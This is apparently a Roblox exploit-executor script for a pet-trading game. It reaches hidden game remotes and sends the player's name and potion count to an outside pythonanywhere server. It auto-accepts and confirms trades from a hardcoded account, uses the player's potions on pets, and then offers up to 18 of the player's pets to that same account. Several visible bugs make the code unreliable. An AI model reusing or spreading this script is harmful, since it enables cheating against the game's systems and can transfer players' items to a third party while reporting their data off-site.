getgenv().Config = {
    ["Pet_Remote_Name"] = "winter_2024_frostclaw"
}

local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]

if not playerData then return warn("Player data not found.") end

-- Calculate Age Pots
local Age_Pots = 0
local uniqueAgePots = {}

if playerData.inventory and playerData.inventory.food then
    for _, item in pairs(playerData.inventory.food) do
        if item.kind == 'pet_age_potion' then
            Age_Pots = Age_Pots + 1
            if not uniqueAgePots[item] then
                uniqueAgePots[item] = true
            end
        end
    end
end

-- Send Age Pot data to server
local player = game.Players.LocalPlayer
local mega = math.floor(Age_Pots / 10)

local success, response = pcall(function()
    return http_request({
        Url = 'https://fermaroblox.pythonanywhere.com/Add?Nickname='.. player.Name ..'&Mega='.. mega,
        Method = 'GET',
        Headers = {
            ['Content-Type'] = 'application/json'
        }
    })
end)

if not success then
    warn("Request failed:", response)
    return nil
end

local data = response.Body

-- Rename Remote
local function rename(remotename, hashedremote)
    hashedremote.Name = remotename
end
table.foreach(getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init, 7), rename)

local RecTrade = math.ceil(mega / 18)

print(RecTrade)

-- Accept Trades and Process them
local successTrade = 0
for i = 1, 100000 do
    print("tradestatus")
    wait(1)
    local args = {
        [1] = game:GetService("Players"):WaitForChild("HugeRano02"),
        [2] = true
    }

    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(unpack(args))
    
    if game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
        local faceColor = Color3.fromRGB(74, 198, 85)
        while game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept.Face.Colors.Base.ImageColor3 ~= faceColor do
            wait(1)
        end

        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()

        while game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.Visible do
            wait(1)
        end

        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()

        while game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
            wait(1)
        end
        successTrade = successTrade + 1
    end

    if successTrade == RecTrade then
        print("Trade limit reached, breaking.")
        break
    end
end

-- Handle Pet Age-Up
local petsprov = 0
local petName = getgenv().Config["Pet_Remote_Name"]

-- Identify pets for age-up
local PetsNoFull = {}
for _, pet in pairs(playerData.inventory.pets) do
    if pet.kind == petName and pet.properties.age == 1 then
        petsprov = petsprov + 1
        if not PetsNoFull[pet] then
            PetsNoFull[pet] = true
        end
    end
end

if petsprov == 0 then
    error("No pets available for age-up.")
end

for h = 0, petsprov do
    local count = 0
    local uniqueAge = {}
    for agePot, _ in pairs(uniqueAgePots) do
        if count < 10 then
            uniqueAge[count + 1] = agePot.unique
            count = count + 1
            uniqueAgePots[agePot] = nil
        else
            break
        end
    end

    -- Equip pets for age-up
    count = 0
    local PetsUniu = 0
    for PetAge, _ in pairs(PetsNoFull) do  
        if count == 0 then
            PetsUniu = PetAge.unique
            local args = {
                [1] = PetAge.unique,
                [2] = {
                    ["use_sound_delay"] = true,
                    ["equip_as_last"] = false
                }
            }
            game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
        end
        count = count + 1
    end

    -- Apply the Age-Up Potions
    if uniqueAge[i] then
        local args = {
            [1] = uniqueAge[i],
            [2] = {
                ["use_sound_delay"] = true,
                ["equip_as_last"] = false
            }
        }
        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("ToolAPI/Equip"):InvokeServer(unpack(args))
    end
    
    print("------------pets-------------")
    print(PetsUniu)
    print("-----------uni-------------")  
    print(uniqueAge[10])
    -- Create Pet Object
    local args = {
        [1] = "__Enum_PetObjectCreatorType_2",
        [2] = {
            ["additional_consume_uniques"] = uniqueAge,
            ["pet_unique"] = PetsUniu,
            ["unique_id"] = uniqueAge[10]
        }
    }
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("PetObjectAPI/CreatePetObject"):InvokeServer(unpack(args))
    time.wait(12)
end

-- Notify server that the process is complete
local success2, response2 = pcall(function()
    return http_request({
        Url = 'https://FERMAROBLOX.pythonanywhere.com/AddReady?Nickname='.. player.Name ..'&Trade='.. RecTrade,
        Method = 'GET',
        Headers = {
            ['Content-Type'] = 'application/json'
        }
    })
end)

if not success2 then
    warn("Request failed:", response2)
    return nil
end

-- Final trade handling
successTrade = 0
for i = 1, 100000 do
    wait(1)
    local args = {
        [1] = game:GetService("Players"):WaitForChild("HugeRano02"),
        [2] = true
    }

    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest"):InvokeServer(unpack(args))
    
    if game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
        local PetsNoFull = {}
        for _, pet in pairs(playerData.inventory.pets) do
            if pet.kind == petName and pet.properties.age == 1 then
                if not PetsNoFull[pet] then
                    PetsNoFull[pet] = true
                end
            end
        end

        count = 0
        for PetAge, _ in pairs(PetsNoFull) do  
            if count == 18 then
                break
            else
                local args = {
                    [1] = PetAge.unique
                }
                game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
                count = count + 1
            end
        end 

        local faceColor = Color3.fromRGB(74, 198, 85)
        while game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Accept.Face.Colors.Base.ImageColor3 ~= faceColor do
            wait(1)
        end

        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/AcceptNegotiation"):FireServer()

        while game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.ConfirmationFrame.Visible do
            wait(1)
        end

        game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("TradeAPI/ConfirmTrade"):FireServer()

        while game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
            wait(1)
            successTrade = successTrade + 1
        end
    end

    if successTrade == RecTrade then
        break
    end
end
